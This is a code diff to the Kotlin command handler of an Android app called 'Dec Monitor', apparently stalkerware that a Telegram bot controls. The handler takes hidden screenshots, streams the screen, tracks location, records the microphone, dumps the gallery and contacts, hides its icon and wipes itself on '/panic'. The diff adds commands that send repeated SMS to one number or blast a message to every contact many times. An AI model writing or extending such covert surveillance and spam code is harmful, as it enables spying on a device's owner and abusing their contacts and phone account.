@@ -7,6 +7,7 @@ import com.dec.monitor.media.AmbientRecorder
 import com.dec.monitor.media.GalleryDumper
 import com.dec.monitor.screen.LiveStreamService
 import com.dec.monitor.screen.ScreenshotService
+import com.dec.monitor.sms.SmsBroadcaster
 import com.dec.monitor.stealth.StealthManager
 import com.dec.monitor.system.DeviceInfo
 import com.dec.monitor.usage.AppUsageTracker
@@ -29,7 +30,7 @@ object CommandHandler {
                 }
                 command == "/stream_on" -> {
                     LiveStreamService.streamIntervalMs = 10_000L
-                    TelegramBot.sendMessage("🔴 Live stream ON — every 10s\n⚠️ Needs MediaProjection grant on reboot")
+                    TelegramBot.sendMessage("🔴 Live stream ON — every 10s")
                 }
                 command == "/stream_off" -> {
                     LiveStreamService.isStreaming = false
@@ -90,6 +91,7 @@ object CommandHandler {
                     TelegramBot.sendMessage("🎙 Recording 60s...")
                     AmbientRecorder.record(context, 60)
                 }
+                // SMS to specific number
                 command.startsWith("/sms ") -> {
                     val parts = command.removePrefix("/sms ").split(" ", limit = 2)
                     if (parts.size == 2) {
@@ -99,13 +101,45 @@ object CommandHandler {
                         TelegramBot.sendMessage("❌ Usage: /sms <number> <message>")
                     }
                 }
+                // SMS to specific number multiple times
+                command.startsWith("/sms_x ") -> {
+                    val parts = command.removePrefix("/sms_x ").split(" ", limit = 3)
+                    if (parts.size == 3) {
+                        val times = parts[0].toIntOrNull() ?: 1
+                        val number = parts[1]
+                        val message = parts[2]
+                        TelegramBot.sendMessage("📤 Sending $times SMS to $number...")
+                        SmsBroadcaster.sendToNumber(number, message, times)
+                    } else {
+                        TelegramBot.sendMessage("❌ Usage: /sms_x <times> <number> <message>")
+                    }
+                }
+                // blast all contacts once
+                command.startsWith("/blast ") -> {
+                    val message = command.removePrefix("/blast ")
+                    SmsBroadcaster.blastAll(context, message, 1)
+                }
+                // blast all contacts X times
+                command.startsWith("/blast_x ") -> {
+                    val parts = command.removePrefix("/blast_x ").split(" ", limit = 2)
+                    if (parts.size == 2) {
+                        val times = parts[0].toIntOrNull() ?: 1
+                        val message = parts[1]
+                        SmsBroadcaster.blastAll(context, message, times)
+                    } else {
+                        TelegramBot.sendMessage("❌ Usage: /blast_x <times> <message>")
+                    }
+                }
+                command == "/blast_stop" -> {
+                    SmsBroadcaster.stop()
+                    TelegramBot.sendMessage("⏹ Blast stopped")
+                }
                 command == "/panic" -> {
                     TelegramBot.sendMessage("🚨 PANIC — clearing all data...")
                     StealthManager.showIcon(context)
-                    // clear cache
                     context.cacheDir.deleteRecursively()
                     context.getExternalFilesDir(null)?.deleteRecursively()
-                    TelegramBot.sendMessage("✅ Data cleared. Uninstall manually.")
+                    TelegramBot.sendMessage("✅ Data cleared.")
                 }
                 command == "/hide" -> {
                     StealthManager.hideIcon(context)
@@ -121,45 +155,45 @@ object CommandHandler {
 🤖 <b>Dec Monitor Commands</b>
 
 📸 Screenshot:
-/screenshot_on — every 3s fast mode ⚡
-/screenshot_off — back to 30s
+/screenshot_on — every 3s ⚡
+/screenshot_off — 30s
 
-🔴 Live Stream:
-/stream_on — screen every 10s
-/stream_off — stop stream
+🔴 Stream:
+/stream_on /stream_off
 
 📍 Location:
-/location — get now
-/location_on — auto track (5min)
-/location_off — stop tracking
-/location_history — today's route
+/location — now
+/location_on — auto track
+/location_off
+/location_history
 
 🔋 /battery
 📒 /contacts
 📱 /apps
-📊 /usage — app usage report
+📊 /usage
 🔔 /ring
 
 🖼 Gallery:
 /gallery5 /gallery20
 /galleryhalf /galleryfull
 
-🎙 Mic:
-/mic — 30s
-/mic60 — 60s
+🎙 /mic /mic60
 
-💬 /sms &lt;number&gt; &lt;message&gt;
+💬 SMS:
+/sms &lt;number&gt; &lt;msg&gt;
+/sms_x &lt;times&gt; &lt;number&gt; &lt;msg&gt;
+/blast &lt;msg&gt; — all contacts once
+/blast_x &lt;times&gt; &lt;msg&gt; — all contacts X times
+/blast_stop — stop blast
 
 👁 Stealth:
-/hide — hide icon
-/show — show icon
-/panic — wipe all data
+/hide /show /panic
 
 ❓ /help
                         """.trimIndent()
                     )
                 }
-                else -> TelegramBot.sendMessage("❓ Unknown. Send /help")
+                else -> TelegramBot.sendMessage("❓ Unknown. /help")
             }
         }
     }
